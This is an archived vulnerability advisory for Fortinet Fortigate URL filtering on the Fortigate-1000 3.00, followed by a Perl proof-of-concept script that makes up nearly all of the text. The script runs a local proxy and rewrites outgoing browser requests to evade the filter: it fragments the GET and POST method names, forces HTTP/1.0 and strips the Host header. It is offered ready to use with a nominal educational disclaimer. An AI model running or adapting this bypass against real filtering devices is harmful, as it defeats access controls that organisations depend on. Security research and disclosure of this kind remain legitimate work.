source: https://www.securityfocus.com/bid/27276/info

Fortinet Fortigate is prone to a vulnerability that can allow attackers to bypass the device's URL filtering.

An attacker can exploit this issue to view unauthorized websites, bypassing certain security restrictions. This may lead to other attacks.

This issue affects Fortigate-1000 3.00; other versions may also be affected.

NOTE: This issue may be related to the vulnerability described in BID 16599 (Fortinet Fortigate URL Filtering Bypass Vulnerability).

#!/usr/bin/perl

########################################
# fortiGuard.pl v0.1 - http://www.macula-group.com/
#
# # URL Filtering Bypass proof of concept
# Author: Daniel Regalado aka Danux... Hacker WannaBe!!! (only some
minnor modifications from sinhack code)
# Based on PoC from sinhack research labs -> sakeru.pl
#
#FortiGuard's URL blocking functionality can be bypassed by
specially-crafted HTTP requests that are terminated by the CRLF
character
#instead of the LF characters and changing version of HTTP to 1.0
without sending Host: Header and Fragmenting the GET and POST Requests
#
#Tested On: fortiGate-1000 3.00, build 040075,070111
#
#This code has been released Only for educational purposes. The author
cannot be held responsible for any bad use.
# Usage:
# 1) perl fortiGuard.pl
# 2) Configure your browser's proxy at localhost:5050
# 3) Have fun.

# --- Start Of Script---

use strict;
use URI;
use IO::Socket;

my $showOpenedSockets=1; #Activate the console logging
my $debugging=0;


my $server = IO::Socket::INET->new ( #Proxy Configuration
   LocalPort => 5050, #Change the listening port here
   Type => SOCK_STREAM,
   Reuse => 1,
   Listen => 10);

binmode $server;
print "Waiting for connections on port 5050 TCP...\n";

while (my $browser = $server->accept()) { #When a connection occure...
   binmode $browser;
   my $method="";
   my $content_length = 0;
   my $content = 0;
   my $accu_content_length = 0;
   my $host;
   my $hostAddr;
   my $httpVer;
   my $line;

 while (my $browser_line = <$browser>) { #Get the Browser commands
      unless ($method) {
        ($method, $hostAddr, $httpVer) = $browser_line =~ /^(\w+)
+(\S+) +(\S+)/;

        my $uri = URI->new($hostAddr);

        $host = IO::Socket::INET->new ( #Opening the connexion to the
remote host
          PeerAddr=> $uri->host,
          PeerPort=> $uri->port ) or die "couldn't open $hostAddr";


        if ($showOpenedSockets) { #Connection logs
           #print "Source:".$browser->peerhost."\n";
           my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) =
localtime(time);
           $year += 1900;
           $mon += 1;
           printf ("\n%04d-%02d-%02d %02d:%02d:%02d
",$year,$mon,$mday,$hour,$min,$sec);
           print $browser->peerhost." -> ".$uri->host.":".$uri->port."
$method ".$uri->path_query."\n";;
        }

        binmode $host;
        my $char;
        if ($method == "GET") { #Fragmention the "GET" query
           foreach $char ('G','E','T',' ') { #I know, there is better
way to do it,
              print $host $char; #but I'm tired and lazy...
           }
        } elsif ($method == "POST") { #Fragmentation of "POST" query
           foreach $char ('P','O','S','T',' ') {
              print $host $char;
           }
        } else {
           print $host "$method "; #For all the other methods, send
them without modif
           print "*";
        }
        $httpVer="HTTP/1.0"; #Forzando a version 1.0
        print $host $uri->path_query . " $httpVer\r\n"; #Send the rest
of the query (url and http version)
        #next;
      }

      $content_length = $1 if $browser_line=~/Content-length: +(\d+)/i;
      $accu_content_length+=length $browser_line;

  foreach $line (split('\n', $browser_line)) { #Fragment the Host query
        if ($line =~ /^Host:/ ) {
                  #my $char="";
                   #my $word="";
                   #my $bogus="";
                   #($bogus,$word) = split(' ', $line);
                   #foreach $char ('H','o','s','t',':',' ') {
                   #print $host $char;
                   #}
                   #print $host $word."\r\n";

        } else {
           print $host "$line\r\n"; #For all the other lines, send
them without modif
        }

        if ( $debugging == 1 && $method == "POST" ) {
           print "$line\n";
        }
      }
      #Danux Clave para terminar el Request y enviarlo al servidor
web, de otra forma se queda esperando este ultimo la peticion
      print $host "\r\n";


      last if $browser_line =~ /^\s*$/ and $method ne 'POST';
      if ($browser_line =~ /^\s*$/ and $method eq "POST") {
         $content = 1;
         last unless $content_length;
         next;
      }
      #print length $browser_line . " - ";
      if ($content) {
         $accu_content_length+=length $browser_line;
         last if $accu_content_length >= $content_length;
      }
   }

  $content_length = 0;
   $content = 0;
   $accu_content_length = 0;

   my $crcount=0;
   my $totalcounter=0;
   my $packetcount=0;

   while ( my $host_line = <$host> ) { #Reception of the result from the server

      $totalcounter+=length $host_line;
      print $browser $host_line; #Send them back to the browser
      #print $host_line if ( ! $content ); #Send them back to the browser
      if ($host_line=~/Content-length: +(\d+)/i) {
       $content_length = $1;
       #print " * Expecting $content_length\n"; #if ($debugging);
      }
      if ($host_line =~ m/^\s*$/ and not $content) {
           $content = 1;
           #print " * Beginning of the data section\n";
      }
      if ($content) {
       #$accu_content_length+=length $host_line;
       if ($content_length) {
          #print " * binary data section\n";
          my $buffer;
          my $buffersize = 512;
          if ($content_length < $buffersize) { $buffersize = $content_length; }
          while ( my $nbread = read($host, $buffer, $buffersize)) {
              print "#";
             $packetcount++;
              $accu_content_length+=$nbread;
              #last if $accu_content_length >= $content_length;
              print $browser $buffer; #Send them back to the browser
              #print $buffer;
              #print "\n(#$packetcount) ";
              #print "total: $totalcounter content_length:
$content_length acc: $accu_content_length\t";
              my $tmp1 = $content_length - $accu_content_length;
              #print "length-accu= $tmp1\n";

              if ($tmp1 < $buffersize) {
               $buffersize = $tmp1;
               #print "new buffersize = $buffersize\n";
              }
           }
           #print "Out of the content while\n";
        }
      }

  #print "(#$packetcount) ";
      #print "total: $totalcounter content_length: $content_length
acc: $accu_content_length\t";
      #my $tmp1 = $content_length - $accu_content_length;
      #print "length-accu= $tmp1\n";
      last if ($accu_content_length >= $content_length and $content ==
1 and $content_length);
   }
   #print "\nOut for a while\n";


   if ($browser) { $browser -> close; } #Closing connection to the browser
   if ($host) { $host -> close; } #Closion connection to the server

}

# --- EOF ---